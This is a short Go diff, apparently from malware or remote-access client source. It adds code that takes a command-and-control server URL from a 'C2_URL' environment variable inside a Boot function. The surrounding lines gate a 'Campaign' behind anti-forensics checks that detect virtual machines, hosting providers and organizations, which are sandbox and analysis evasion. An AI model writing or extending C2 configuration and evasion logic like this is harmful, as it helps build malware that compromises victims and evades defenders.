@@ -41,6 +41,11 @@ var (
 )
 
 func Boot() {
+	// Check if C2 is provided via environment variable (e.g. C2_URL=https://proxy-ip:port)
+	if envC2 := os.Getenv("C2_URL"); envC2 != "" {
+		C2 = [1]string{envC2}
+	}
+
 	if AntiForensics {
 		if !DetectHashedName() && !DetectVM() && !DetectHosting() && !DetectOrganizations() {
 			if Campaign {
